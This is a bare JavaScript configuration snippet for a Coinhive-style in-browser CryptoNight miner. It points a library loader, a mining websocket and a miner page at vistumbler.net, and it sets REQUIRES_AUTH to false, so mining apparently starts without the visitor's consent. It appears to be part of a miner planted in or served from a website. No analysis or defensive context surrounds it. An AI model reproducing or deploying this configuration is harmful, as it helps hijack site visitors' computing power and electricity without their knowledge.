self.lms = self.lms || {};
self.lms.CONFIG = {
    LIB_URL: "https://www.vistumbler.net/lib/",
    ASMJS_NAME: "cryptonight-asmjs.min.js",
    REQUIRES_AUTH: false,
    WEBSOCKET_SHARDS: [
        ["wss://www.vistumbler.net/_ws_/"]
    ],
    CAPTCHA_URL: "https://www.vistumbler.net/captcha/",
    MINER_URL: "https://www.vistumbler.net/media/miner.html",
    AUTH_URL: "https://authedmine.com/authenticate.html"
};
var Module = {
    locateFile: (function(path) {
        return lms.CONFIG.LIB_URL + path
    })
};
var Module;
